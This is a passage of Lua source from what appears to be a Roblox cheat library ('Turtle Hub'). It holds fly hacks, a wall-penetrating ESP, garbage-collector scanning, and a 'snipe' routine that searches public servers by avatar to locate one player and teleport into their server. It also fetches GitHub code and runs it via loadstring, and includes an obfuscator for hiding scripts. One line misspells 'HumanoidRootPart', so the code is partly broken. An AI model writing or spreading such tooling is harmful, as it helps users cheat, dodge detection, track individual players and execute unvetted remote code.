		if LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid") and LocalPlayer.Character.HumanoidRootPart and LocalPlayer.Character.HumanoidRootPart:FindFirstChild(velocityHandlerName) and LocalPlayer.Character.HumanoidRootPart:FindFirstChild(gyroHandlerName) then
			LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].MaxForce = Vector3.new(9e9,9e9,9e9)
			LocalPlayer.Character.HumanoidRootPart[gyroHandlerName].MaxTorque = Vector3.new(9e9,9e9,9e9)
			if vfly == false then
				LocalPlayer.Character.Humanoid.PlatformStand = true
			end
			LocalPlayer.Character.HumanoidRootPart[gyroHandlerName].CFrame = workspace.CurrentCamera.CoordinateFrame
			LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity = Vector3.new()

			if controlModule:GetMoveVector().X > 0 then
				LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity = LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity + workspace.CurrentCamera.CFrame.RightVector * (controlModule:GetMoveVector().X * ((vfly and vflyspeed or mobileflyspeed) * 50))
			end
			if controlModule:GetMoveVector().X < 0 then
				LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity = LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity + workspace.CurrentCamera.CFrame.RightVector * (controlModule:GetMoveVector().X * ((vfly and vflyspeed or mobileflyspeed) * 50))
			end
			if controlModule:GetMoveVector().Z > 0 then
				LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity = LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity - workspace.CurrentCamera.CFrame.LookVector * (controlModule:GetMoveVector().Z * ((vfly and vflyspeed or mobileflyspeed) * 50))
			end
			if controlModule:GetMoveVector().Z < 0 then
				LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity = LocalPlayer.Character.HumanoidRootPart[velocityHandlerName].Velocity - workspace.CurrentCamera.CFrame.LookVector * (controlModule:GetMoveVector().Z * ((vfly and vflyspeed or mobileflyspeed) * 50))
			end
		end
	end)
end

local function FLY(vfly,tweenbool,tweenspeed)
	repeat wait() until LocalPlayer and LocalPlayer.Character and Players.LocalPlayer.Character.HumanoidRootPart and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	repeat wait() until Mouse
	if flyKeyDown or flyKeyUp then
		flyKeyDown:Disconnect()
		flyKeyUp:Disconnect()
	end

	local T = LocalPlayer.Character.HumanoidRoodPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0

	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro')
		local BV = Instance.new('BodyVelocity')
		BG.P = 9e4
		BG.Parent = T
		BV.Parent = T
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		task.spawn(function()
			repeat wait()
				if vfly == false and LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then -- not
					if game.PlaceId == 277751860 then -- Epic Minigames
						if LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and LocalPlayer.Character.HumanoidRootPart then
							local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
							local root = LocalPlayer.Character.HumanoidRootPart
							hum:ChangeState(0)
							root.Velocity = root.CFrame.LookVector * 30
						end
					else
						LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
					end
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					if tweenbool == false then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						TweenService:Create(BV,TweenInfo.new(tweenspeed,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R,(CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2,0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED}):Play()
					end
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					if tweenbool == false then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else 
						TweenService:Create(BV,TweenInfo.new(tweenspeed,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R,(lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2,0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED}):Play()
					end
				else
					BV.velocity = Vector3.new(0,0,0)
					--TweenService:Create(BV,TweenInfo.new(0.5,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{velocity = Vector3.new(0,0,0)}):Play()
				end
				--BG.cframe = workspace.CurrentCamera.CoordinateFrame
				if tweenbool == false then
					TweenService:Create(BG,TweenInfo.new(0.01,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{cframe = workspace.CurrentCamera.CoordinateFrame}):Play()
				else
					BG.cframe = workspace.CurrentCamera.CoordinateFrame
				end
			until FLYING == false -- not
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:Destroy()
			BV:Destroy()
			if LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end
	flyKeyDown = Mouse.KeyDown:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = (vfly and vflyspeed or mobileflyspeed)
		elseif KEY:lower() == 's' then
			CONTROL.B = - (vfly and vflyspeed or mobileflyspeed)
		elseif KEY:lower() == 'a' then
			CONTROL.L = - (vfly and vflyspeed or mobileflyspeed)
		elseif KEY:lower() == 'd' then 
			CONTROL.R = (vfly and vflyspeed or mobileflyspeed)
		elseif QEfly and KEY:lower() == 'e' then
			CONTROL.Q = (vfly and vflyspeed or mobileflyspeed) * 2
		elseif QEfly and KEY:lower() == 'q' then
			CONTROL.E = -(vfly and vflyspeed or mobileflyspeed) * 2
		end
		pcall(function()
			workspace.CurrentCamera.CameraType = Enum.CameraType.Track
		end)
	end)
	flyKeyUp = Mouse.KeyUp:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'e' then
			CONTROL.Q = 0
		elseif KEY:lower() == 'q' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

local function NOFLY() -- for PC
	FLYING = false
	if flyKeyDown or flyKeyUp then
		flyKeyDown:Disconnect()
		flyKeyUp:Disconnect()
	end
	if LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
		LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end
	pcall(function()
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
	end)
end

function lib:startFly(vfly) --,fspeed,vspeed)
	--mobileflyspeed = fspeed or 1
	--vflyspeed = vspeed or 1
	if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
		--return "Mobile"
		lib:mobilefly(vfly)
	else
		--return "PC"
		FLY(vfly,false,0)
	end
end
--lib:unmobilefly()
function lib:stopFly()
	if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
		--return "Mobile"
		lib:unmobilefly()
	else
		--return "PC"
		NOFLY()
	end
end

local function getUserAvatarByUserId(ChangeTargetUserId)
    local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..ChangeTargetUserId.."&size=48x48&format=Png&isCircular=false"
    local response = http({Url = url}).Body
    return HttpService:JSONDecode(response).data[1].imageUrl
end

local function getUserAvatarsByTokens(playerTokens)
    local url = "https://thumbnails.roblox.com/v1/batch"
    local data = {}
    for _,token in ipairs(playerTokens) do
        table.insert(data,{
            token = token,
            type = "AvatarHeadShot",
            size = "48x48",
            isCircular = false
        })
    end
    data = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = http({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = data
    }).Body
    local imageUrls = {}
    for _,item in ipairs(HttpService:JSONDecode(response).data) do
        table.insert(imageUrls,item.imageUrl)
    end
    return imageUrls
end

function lib.isPlayerBehindWall(v,range)
	if workspace:FindPartOnRayWithIgnoreList(Ray.new(v.Character.HumanoidRootPart.Position,(v.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).unit * range),LocalPlayer.Character:GetDescendants()) == v.Character.HumanoidRootPart then
		return "Behind wall"
	else
		return "Non-Behind wall"
	end
end

function lib.getHiddenConnection(b,get)
	local bool = b or true
	for i,v in pairs(getgc(bool)) do
		get(i,v)
	end
end

function lib:notify(str,time)
	Notif:NotifyUser(str,time)
end

local function getSmaller(a,b,notLast)
	local aByte = a:byte() or -1
	local bByte = b:byte() or -1
	if aByte == bByte then
		if notLast and #a == 1 and #b == 1 then
			return -1
		elseif #b == 1 then
			return false
		elseif #a == 1 then
			return true
		else
			return getSmaller(a:sub(2),b:sub(2),notLast)
		end
	else
		return aByte < bByte
	end
end
--lib.parseData(t,0,false,{},nil,false)
function lib.parseData(obj,numTabs,isKey,overflow,noTables,forceDict)
	local objType = typeof(obj)
	local objStr = tostring(obj)
	if objType == "table" then
		if noTables then
			return objStr
		end
		local isCyclic = overflow[obj]
		overflow[obj] = true
		local out = {}
		local nextIndex = 1
		local isDict = false
		local hasTables = false
		local data = {}

		for key,val in next,obj do
			if not hasTables and typeof(val) == "table" then
				hasTables = true
			end

			if not isDict and key ~= nextIndex then
				isDict = true
			else
				nextIndex = nextIndex + 1
			end

			data[#data+1] = {key,val}
		end

		if isDict or hasTables or forceDict then
			out[#out+1] = (isCyclic and "Cyclic " or "") .. "{"
			table.sort(data,function(a,b)
				local aType = typeof(a[2])
				local bType = typeof(b[2])
				if bType == "string" and aType ~= "string" then
					return false
				end
				local res = getSmaller(aType,bType,true)
				if res == -1 then
					return getSmaller(tostring(a[1]),tostring(b[1]))
				else
					return res
				end
			end)
			for i = 1,#data do
				local arr = data[i]
				local nowKey = arr[1]
				local nowVal = arr[2]
				local parseKey = lib.parseData(nowKey,numTabs+1,true,overflow,isCyclic)
				local parseVal = lib.parseData(nowVal,numTabs+1,false,overflow,isCyclic)
				if isDict then
					local nowValType = typeof(nowVal)
					local preStr = ""
					local postStr = ""
					if i > 1 and (nowValType == "table" or typeof(data[i-1][2]) ~= nowValType) then
						preStr = "\n"
					end
					if i < #data and nowValType == "table" and typeof(data[i+1][2]) ~= "table" and typeof(data[i+1][2]) == nowValType then
						postStr = "\n"
					end
					out[#out+1] = preStr .. string.rep(tabChar,numTabs+1) .. parseKey .. " = " .. parseVal .. "," .. postStr
				else
					out[#out+1] = string.rep(tabChar,numTabs+1) .. parseVal .. ","
				end
			end
			out[#out+1] = string.rep(tabChar,numTabs) .. "}"
		else
			local data2 = {}
			for i = 1,#data do
				local arr = data[i]
				local nowVal = arr[2]
				local parseVal = lib.parseData(nowVal,0,false,overflow,isCyclic)
				data2[#data2+1] = parseVal
			end
			out[#out+1] = "{\n" .. tabChar .. table.concat(data2,",\n" .. tabChar) .. "\n}"
		end

		return table.concat(out,"\n")
	else
		local returnVal = nil
		if (objType == "string" or objType == "Content") and (not isKey or tonumber(obj:sub(1,1))) then
			local retVal = '"' .. objStr .. '"'
			if isKey then
				retVal = "[" .. retVal .. "]"
			end
			returnVal = retVal
		elseif objType == "EnumItem" then
			returnVal = "Enum." .. tostring(obj.EnumType) .. "." .. obj.Name
		elseif objType == "Enum" then
			returnVal = "Enum." .. objStr
		elseif objType == "Instance" then
			returnVal = obj.Parent and obj:GetFullName() or obj.ClassName
		elseif objType == "CFrame" then
			returnVal = "CFrame.new(" .. objStr .. ")"
		elseif objType == "Vector3" then
			returnVal = "Vector3.new(" .. objStr .. ")"
		elseif objType == "Vector2" then
			returnVal = "Vector2.new(" .. objStr .. ")"
		elseif objType == "UDim2" then
			returnVal = "UDim2.new(" .. objStr:gsub("[{}]", "") .. ")"
		elseif objType == "BrickColor" then
			returnVal = "BrickColor.new(\"" .. objStr .. "\")"
		elseif objType == "Color3" then
			returnVal = "Color3.new(" .. objStr .. ")"
		elseif objType == "NumberRange" then
			returnVal = "NumberRange.new(" .. objStr:gsub("^%s*(.-)%s*$", "%1"):gsub(" ", ", ") .. ")"
		elseif objType == "PhysicalProperties" then
			returnVal = "PhysicalProperties.new(" .. objStr .. ")"
		else
			returnVal = objStr
		end
		return returnVal
	end
end

--[[function tableToString(t)
	return parseData(t,0,false,{},nil,false)
end]]

function lib:ColorFonts(str,color)
	if color == "Bold" then --✓
		return "<b>" .. str .. "</b>"
	elseif color == "Italic" then --✓
		return "<i>" .. str .. "</i>"
	elseif color == "Underline" then --✓
		return "<u>" .. str .. "</u>"
	elseif color == "Strike" then --✓
		return "<s>" .. str .. "</s>"
	elseif color == "Sub" then --✓
		return "<sub>" .. str .. "</sub>"
	elseif color == "Sup" then --✓
		return "<sup>" .. str .. "</sup>"
	elseif color == "Small" then --✓
		return "<small>" .. str .. "</small>"
	elseif color == "Big" then --x
		return "<big>" .. str .. "</big>"
	elseif color == "Span" then --x
		return "<span>" .. str .. "</span>"
	elseif color:sub(1,4) == "Bold" then -- Bold,k
		return "<font color='" .. HTMLcolors[color:sub(6,#color)] .. "'><b>" .. str .. "</b></font>"
	elseif color:sub(1,6) == "Italic" then
		return "<font color='" .. HTMLcolors[color:sub(8,#color)] .. "'><i>" .. str .. "</i></font>"
	elseif color:sub(1,9) == "Underline" then
		return "<font color='" .. HTMLcolors[color:sub(11,#color)] .. "'><u>" .. str .. "</u></font>"
	elseif color:sub(1,6) == "Strike" then
		return "<font color='" .. HTMLcolors[color:sub(8,#color)] .. "'><s>" .. str .. "</s></font>"
	elseif color:sub(1,3) == "Sub" then
		return "<font color='" .. HTMLcolors[color:sub(5,#color)] .. "'><sub>" .. str .. "</sub></font>"
	elseif color:sub(1,3) == "Sup" then
		return "<font color='" .. HTMLcolors[color:sub(5,#color)] .. "'><sup>" .. str .. "</sup></font>"
	elseif color:sub(1,5) == "Small" then
		return "<font color='" .. HTMLcolors[color:sub(7,#color)] .. "'><small>" .. str .. "</small></font>"
	elseif color:sub(1,3) == "Big" then
		return "<font color='" .. HTMLcolors[color:sub(5,#color)] .. "'><big>" .. str .. "</big></font>"
	elseif color:sub(1,4) == "Span" then
		return "<font color='" .. HTMLcolors[color:sub(6,#color)] .. "'><span>" .. str .. "</span></font>"
	else
		return "<font color='" .. HTMLcolors[color] .. "'>" .. str .. "</font>"
	end
end

function lib:LoadRepository(path,bool)
	local gui = bool or false
	if path:find("raw.githubusercontent.com") or path:find("api.github.com") or path:find("gist.github.com") then
		local errorread,logic = pcall(function()
			return http({
					Url = path,
					Method = "GET",
					Headers = {
						["Authorization"] = "Bearer " .. GithubKey
					}
				})
		end)
		--local loadFunction = loadstring(async.Body)
		local success,ModuleScript = pcall(loadstring,logic.Body)
		if errorread then
			if success and ModuleScript then
				if gui == true then
					lib:notify(lib:ColorFonts("[ Turtle-Client ] Injecting a UI...","Bold,Green"),5)
					return ModuleScript()
				elseif gui == false then
					lib:notify(lib:ColorFonts("[ Turtle-Client ] Injecting a script...","Bold,Green"),5)
					lib:ErrorReader(function()
						ModuleScript()
					end)
					lib:notify(lib:ColorFonts("[ Turtle-Client ] Done injecting...","Bold,Green"),5)
				end
			else
				TurtleScreenNotify("Turtle Hub | Error","Failed to run script. Error located at \n" .. ModuleScript .. "\n" .. success,{},nil,{}) --logic.Body,{},nil,{})
			end
		else
			TurtleScreenNotify("Turtlen Hub | " .. tostring(logic.StatusCode),"Failed to make HTTP Request. Error Code : " .. tostring(logic.StatusCode),{},nil,{})
		end
	else
		lib:notify(lib:ColorFonts("ONLY GITHUB API ENDPOINT ARE ALLOWED TO USE THIS FUNCTION","Bold,Red"),10)
	end
end

function lib.CodeEncrypter(b)
	local c = "function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; "
  	local d = c
  	local e = ""
  	local f = {"IllIllIllIllI","IIlllIIlllIIlllIIlllII","IIllllIIllll"}
  	local g = [[local IlIlIlIlIlIlIlIlII = {]]
  	local h = [[local IllIIllIIllIII = loadstring]]
  	local i = [[local IllIIIllIIIIllI = table.concat]]
  	local j = [[local IIIIIIIIllllllllIIIIIIII = "''"]]
  	local k = "local " .. f[math.random(1,#f)] .. " = (7*3-9/9+3*2/0+3*3);"
  	local l = "local " .. f[math.random(1,#f)] .. " = (3*4-7/7+6*4/3+9*9);"
  	local m = "--// Obfuscated with Turtle-Protector 7.5 by Fahri \n\n"
  	for n = 1,string.len(b) do 
    		e = e .. "'\\" .. string.byte(b,n) .. "',"
  	end
  	local o = "function IllIIIIllIIIIIl(" .. f[math.random(1,#f)] .. ")"
  	local p = "function " .. f[math.random(1,#f)] .. "(".. f[math.random(1,#f)] .. ")"
  	local q = "local " .. f[math.random(1,#f)] .. " = (5*3-2/8+9*2/9+8*3)"
  	local r = "end"
  	local s = "IllIIIIllIIIIIl(900283)"
  	local t = "function IllIlllIllIlllIlllIlllIllIlllIIIlll(" .. f[math.random(1,#f)] .. ")"
  	local q = "function " .. f[math.random(1,#f)] .. "(" .. f[math.random(1,#f)] .. ")"
  	local u = "local " .. f[math.random(1,#f)] .. " = (9*0-7/5+3*1/3+8*2)"
  	local v = "end"
  	local w = "IllIlllIllIlllIlllIlllIllIlllIIIlll(9083)"
  	local x = m .. d .. k .. l .. i .. ";" .. o .. " " .. p .. " " .. q .. " " .. r .. " " .. r .. " " .. r .. ";" .. s .. ";" .. t .. " " .. q .. " " .. u .. " " .. v .. " " .. v .. ";" .. w .. ";" .. h .. ";" .. g .. e .. "}" .. "IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()"
  	return x
end

--[[
elseif args[1] == "Snipe Progress server scanned" then
		ProgressBarDEPSO1:SetPercentage(args[2] % args[3])
	elseif args[1] == "Snipe Progress page scanned" then
		ProgressBarDEPSO2:SetPercentage(args[2] % args[3])
]]

function lib.snipe(gameID,userID)
	local userAvatarUrl = getUserAvatarByUserId(userID) 
	local cursor = ""
	local sniperfound = false
	local sniperpage = 1
	TurtleRemoteEvent:Fire("SHOW CONSOLE",true)
	TurtleRemoteEvent:Fire("SHOW TAB",2)
    
	repeat 
	local url = "https://games.roblox.com/v1/games/" .. gameID .. "/servers/Public?sortOrder=Asc&limit=100"
	if cursor then
            url = url .. "&cursor=" .. cursor
        end
        local response = http({ Url = url }).Body
        local data = HttpService:JSONDecode(response)
        for i,server in ipairs(data.data) do 
	    wait()
	    TurtleRemoteEvent:Fire("Snipe Progress server scanned",tonumber(i),#data.data)
            TurtleRemoteEvent:Fire("Snipe Progress page scanned",sniperpage,100)
            TurtleRemoteEvent:Fire("CONSOLE LOG","Scanning servers (Page " .. sniperpage .. " - " .. i .. "/" .. #data.data .. " - " .. server.playing .. " online)",30)
            local serverAvatarUrls = getUserAvatarsByTokens(server.playerTokens)
            for _,serverAvatarUrl in ipairs(serverAvatarUrls) do
                wait()
                if serverAvatarUrl == userAvatarUrl then
                    lib:notify(lib:ColorFonts("Player found, Teleporting...","Bold,Green"),30)
		    TurtleRemoteEvent:Fire("CONSOLE LOG",lib:ColorFonts("Player found, Teleporting...","Bold,Green"))
                    TeleportService:TeleportToPlaceInstance(gameID,server.id,LocalPlayer)
                    wait(0.1)
                    sniperfound = true
                    break
                end
            end
            if sniperfound then
		break
	    end
        end
    
        cursor = data.nextPageCursor or ""
        sniperpage = sniperpage + 1
    until sniperfound or cursor == ""
    
    if not sniperfound then
        lib:notify(lib:ColorFonts("The user could not be found in the game.","Bold,Red"),30)
	TurtleRemoteEvent:Fire("CONSOLE LOG",lib:ColorFonts("The user could not be found in the game.","Bold,Red"))
	TurtleRemoteEvent:Fire("SHOW CONSOLE",false)
    end
end

local function Exploit()
	if identifyexecutor then
		return identifyexecutor()
	end
end

function lib.createESP(instance,po)
	if typeof(instance) == "Instance" then 
		if type(po) == "table" then
			local esp = Instance.new("Highlight")
			esp.Name = "TURTLE XRAY"
			esp.FillColor = po.fill
			esp.OutlineColor = po.outline
			esp.FillTransparency = 0
			esp.OutlineTransparency = 1
			esp.Adornee = instance
			esp.Parent = instance
			esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		else
			lib:notify(lib:ColorFonts("The second argument must be a " .. lib:ColorFonts(lib:ColorFonts("table","Underline"),"Bold") .. " to make this function working properly","Red"),30)
		end
	else
		lib:notify(lib:ColorFonts("The first argument must be an " .. lib:ColorFonts(lib:ColorFonts("instance","Underline"),"Bold") .. " to make this function working properly","Red"),30)
	end
end --lib.createESP(v,{fill = Color3.new(0,1,0),outline = Color3.new(1,1,1)})

function lib.revokeESP()
	lib:descendant(workspace,function(v)
		if v:IsA("Highlight") and v.Name == "TURTLE XRAY" then
			v:Destroy()
		end
	end)
end

--lib.clickScreen("corner")
function lib.clickScreen(area,targetclick)
	local hitpos = (typeof(targetclick) == "Vector3" and targetclick or Vector3.new(0,0,0))
  	if area == "middle" then
		if isGuiOpened == false then
			VirtualInputManager:SendMouseButtonEvent(Camera.ViewportSize.X / 2,Camera.ViewportSize.Y / 2,0,true,game,1)
			VirtualInputManager:SendMouseButtonEvent(Camera.ViewportSize.X / 2,Camera.ViewportSize.Y / 2,0,false,game,1)
		end
 	elseif area == "corner" then
		if isGuiOpened == false then
			VirtualInputManager:SendMouseButtonEvent(0,0,0,true,game,1)
			VirtualInputManager:SendMouseButtonEvent(0,0,0,false,game,1)
		end
  	elseif area == "custom" then
		if isGuiOpened == false then
			local pos,OnScreen = Camera:WorldToViewportPoint(hitpos)
			if OnScreen == true then
				VirtualInputManager:SendMouseButtonEvent(pos.X,pos.Y,0,true,game,1)
				VirtualInputManager:SendMouseButtonEvent(pos.X,pos.Y,0,false,game,1)
			end
		end
  	end
end

function lib.getCharacterElementChanged(name,f)
	LocalPlayer.Character:GetPropertyChangedSignal(name):Connect(function()
		f()
	end)
end

function lib.promptNewRig(rig)
	local humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
	if humanoid then
		AvatarEditorService:PromptSaveAvatar(humanoid.HumanoidDescription,Enum.HumanoidRigType[rig])
		local result = AvatarEditorService.PromptSaveAvatarCompleted:Wait()
		if result == Enum.AvatarPromptResult.Success then
			LocalPlayer.Character:BreakJoints()
		else
			--lib:notify(lib:ColorFonts("There was a problem trying to change your character's rig!","Bold,Red"),10)
			TurtleScreenNotify("Turtle Hub | Avatar Rig Changed","Theres was a problem trying to change ur character's rig!",{},3,{})
		end
	end
end

function lib.getHumanoidElementChanged(name,f)
	LocalPlayer.Character.Humanoid:GetPropertyChangedSignal(name):Connect(function()
		f()
	end)
end

function lib.getRootElementChanged(name,f)
	LocalPlayer.Character.HumanoidRootPart:GetPropertyChangedSignal(name):Connect(function()
		f()
	end)
end

function lib.getRootDistance(instance)
	if typeof(instance) == "Instance" then
		return (LocalPlayer.Character.HumanoidRootPart.Position - instance.Position).Magnitude
	elseif typeof(instance) == "Vector3" then
		return (LocalPlayer.Character.HumanoidRootPart.Position - instance).Magnitude
	elseif typeof(instance) == "CFrame" then
		return (LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(instance.X,instance.Y,instance.Z)).Magnitude
	else
		lib:notify(lib:ColorFonts("The first argument must be an " .. lib:ColorFonts(lib:ColorFonts("instance","Underline"),"Bold") .. " or " .. lib:ColorFonts(lib:ColorFonts("Vector3","Underline"),"Bold") .. " or " .. lib:ColorFonts(lib:ColorFonts("CFrame (3D Position)","Underline"),"Bold") .. " to make this function working properly","Red"),30)
	end
end

function lib.getElementChanged(instance,name,f)
	instance:GetPropertyChangedSignal(name):Connect(function()
		f()
	end)
end
--[[
TP_DISTANCE = {under = -20,top = 20,behind = 1.5,tpm = "behind"}
]]
function lib:TeleportMethod(mthd,str,param)
	TP_DISTANCE = param or {under = -20,top = 20,behind = 1.5,tpm = "behind",tps = "Based On Magnitude",TweenSpeed = 0.7,Rotation = 20}
	if mthd == "tween" then
		if TP_DISTANCE.tps == "Based On Magnitude" then
			if TP_DISTANCE.tpm == "top" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(-TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.top,0)}):Play()
			elseif TP_DISTANCE.tpm == "under" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.under,0)}):Play()
			elseif TP_DISTANCE.tpm == "behind" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.new(0,0,TP_DISTANCE.behind)}):Play()
			else
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(lib.getRootDistance(str) * 0.05,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str}):Play()
			end
		elseif TP_DISTANCE.tps == "Based On Speed" then
			if TP_DISTANCE.tpm == "top" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(-TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.top,0)}):Play()
			elseif TP_DISTANCE.tpm == "under" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.under,0)}):Play()
			elseif TP_DISTANCE.tpm == "behind" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.new(0,0,TP_DISTANCE.behind)}):Play()
			else
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(math.max(lib.getRootDistance(str) / TP_DISTANCE.TweenSpeed,1),Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str}):Play()
			end
		elseif TP_DISTANCE.tps == "Based On Speed 2" then
			if TP_DISTANCE.tpm == "top" then
				TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(TP_DISTANCE.TweenSpeed,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame = str * CFrame.Angles(math.rad(-TP_DISTANCE.Rotation),0,0) + Vector3.new(0,TP_DISTANCE.top,0)}):Play()
			elseif TP_DISTANCE.tpm == "under" then
